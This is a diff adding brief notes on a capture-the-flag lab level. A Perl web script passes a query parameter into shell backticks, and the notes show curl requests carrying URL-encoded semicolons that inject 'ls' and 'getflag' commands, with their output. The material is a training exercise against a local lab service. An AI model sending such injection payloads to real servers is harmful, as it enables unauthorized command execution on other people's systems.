@@ -1,0 +1,46 @@
+level04:
+
+observations:
+	Perl file (executable): level04.pl
+		permissions set to READ ONLY
+
+Comment inside of level04.pl says:
+	localhost:4747
+
+run:
+	$ curl localhost:4747
+	( newline )
+
+analyze perl file:
+
+	print `echo $y 2>&1`
+
+google "perl backtick"
+
+Perl runs code between backticks/quotes as shell commands
+
+$y is linked to $_[0]; which is the first function argument
+The first function argument is param("x");
+
+Try setting x in query in url:
+
+	$ curl localhost:4747/?x=test
+	test
+
+Try to run other commands:
+	$ curl localhost:4747/?x="a; ls;"
+	a
+
+Escape semicolons and spaces:
+	$ curl localhost:4747/?x="a%3b+ls%3b"
+	a
+	level04.pl
+
+Assume we're running as flag04 user.
+
+Run:
+	$ curl localhost:4747/?x="a%3bgetflag%3becho f"
+	a
+	Check flag. Here is your token: ....
+	f
+
